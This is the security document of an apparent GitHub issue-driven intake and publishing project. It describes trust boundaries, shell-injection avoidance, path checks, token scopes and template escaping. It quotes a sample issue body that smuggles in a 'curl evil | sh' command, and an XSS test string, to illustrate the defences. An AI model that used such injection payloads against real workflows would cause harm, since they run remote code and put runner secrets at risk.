# Security

## Trust boundaries

```
untrusted                         |  trusted code, untrusted data            |  trusted
browser form, issue title/body,   |  intake.yml + bin/issueparse/validate    |  App private key (secret)
issue author login, payload JSON  |  publish.yml + bin/pagegen/ledger        |  terraform state (no secrets)
```

Everything a requester types is data until one of our binaries has checked it against a
closed rule: a regexp, an enum, a length. The workflows never interpret it as code.

## No secrets in the browser

The intake site is static HTML, one CSS file and two small scripts. The form never
calls an API: it builds a `github.com/.../issues/new?...` URL and navigates to it, and
GitHub's own UI, under the user's own session, files the issue. There is no token to
steal because the page has none. Both sites ship a strict CSP via `<meta>` (scripts and
connections to `'self'` only; the lab page adds `'wasm-unsafe-eval'`) and
`referrer: no-referrer` so prefilled URLs do not leak in `Referer` headers.

## Untrusted text reaches shell only through `env:`

GitHub expands `${{ }}` before the shell runs, so `run: echo "${{ github.event.issue.body }}"`
lets a body like `"; curl evil | sh; "` execute. Every workflow here passes event text
through `env:` (`BODY`, `EVENT`, `COMMENT`) and the scripts quote it (`printf '%s' "$BODY"`).
`scripts/preflight.sh` fails when it finds `run:` lines that interpolate
`github.event.issue`, `.comment` or `.client_payload`.

Values that do get written to `$GITHUB_OUTPUT` come from `pagegen -describe`, which prints
only fields that passed `event.Decode`: logins (`^[A-Za-z0-9][A-Za-z0-9-]{0,38}(\[bot\])?$`),
repo names, numbers, item ids (`source/template/issue`, fixed alphabet). Free text
(`reason`, `payload`) is never printed there. Multi-line comment bodies use a random
heredoc delimiter.

## Paths cannot escape `items/`

An item id becomes a filesystem path, so `event.CleanItemID` is the only constructor:
three parts, a source matching `^[a-z0-9][a-z0-9-]{0,46}[a-z0-9]$`, a template from a
closed list, a canonical positive integer. `../`, absolute paths, extra slashes and
`01` are all rejected (unit tests and a fuzz target). Template headers may set the
artifact extension only to `[a-z0-9]{1,12}(\.[a-z0-9]{1,12})?`. `Site.Write` refuses
any output path containing `..`.

## Payload integrity

The intake sends the payload as a compact JSON string plus its sha256; the library
recomputes the hash and refuses a mismatch. This catches truncation and accidental
reshaping, not malice: anyone who can dispatch can compute a hash. Authenticity comes from
who can dispatch at all, which is anyone with `contents: write` on the library: the App,
and maintainers.

## Token scope

| Token | Minted by | Scope | Used for |
|---|---|---|---|
| `GITHUB_TOKEN` (intake) | Actions | `contents: read`, `issues: write` on intake | labels, invalid comments |
| App installation token | `create-github-app-token@v3` | `repositories: issueops-library,issueops-intake`; App permissions Contents RW, Issues RW, Metadata R | dispatch; push to library `main`; comment/close on intake |
| `GITHUB_TOKEN` (library deploy) | Actions | `pages: write`, `id-token: write` | Pages deploy only |

- The App has no administration, workflow or secrets permissions: it cannot change
  rulesets, edit workflows (`.github/workflows/**` pushes need the `workflows` permission),
  or read secrets.
- Installation tokens expire after one hour and are minted per job.
- The App is the ruleset's only bypass actor, so it can push data commits to library
  `main`; people go through pull requests.
- `APP_PRIVATE_KEY` is set with `gh secret set` from a file on stdin; it is never in argv,
  Terraform state or the repository. Rotate per [OPERATIONS](OPERATIONS.md#rotate-the-app-key).
- `actions/checkout` uses `persist-credentials: false` wherever the job does not push.

## Escaping

- **HTML** pages use `html/template`, which escapes by context: element text, attributes,
  URLs (a `javascript:` URL becomes `#ZgotmplZ`) and JS. A payload containing
  `<script>alert(1)</script>` is rendered as text on the item page (test `TestEscaping`
  in both modules). Nothing is marked `template.HTML` except the output of `mdLinks`,
  which escapes everything and emits only `<a href="https://...">` for Markdown links.
- **Artifacts** use `text/template` on purpose: a Caddyfile must contain literal `{`
  and a workflow `${{ }}`. Artifacts are served as files and shown escaped in HTML, never
  inlined unescaped.
- **XML** (Atom) uses `text/template` with an explicit `xml.EscapeText` function;
  the feed is parsed with `encoding/xml` in tests.
- **Markdown comments** use `text/template` with `code` (fences with a fence longer than
  any in the input) and `inline` (backticks, `|` escaped, newlines flattened) so user text
  cannot inject Markdown, tables or `@mentions` into bot comments. Comment templates run
  with `missingkey=error`, and there is no `env` function, so runner secrets cannot be
  templated into a public comment by mistake.

## Prefill URLs

- Prefilled values become part of a URL: they appear in browser history, and anywhere
  the user pastes the link. The form warns nothing secret belongs in a payload; the
  validator does not and cannot detect secrets.
- GitHub honours `?<field-id>=value` for `input` and `textarea` fields. Dropdown and
  checkbox prefill is not reliable, so the page does not send those and tells the user to
  pick them on GitHub. A prefill is a suggestion: whatever the user submits is what
  `issueparse` and `validate` check.
- URLs over 7,000 characters are refused client-side (browsers and proxies start
  truncating around 8 KB); the user is told to open the plain form and paste or attach.

## Fragments and htmx

htmx is vendored (v2.0.11, 0BSD, `SHA256SUMS` checked in preflight and in a test), loaded
from `'self'`, and configured with `selfRequestsOnly: true` and `allowEval: false`. It
only issues GETs to static fragments that the same build produced.

## Reporting

Report vulnerabilities privately through the repository's Security tab ("Report a
vulnerability"), not in an issue: issues here are processed by automation and public.
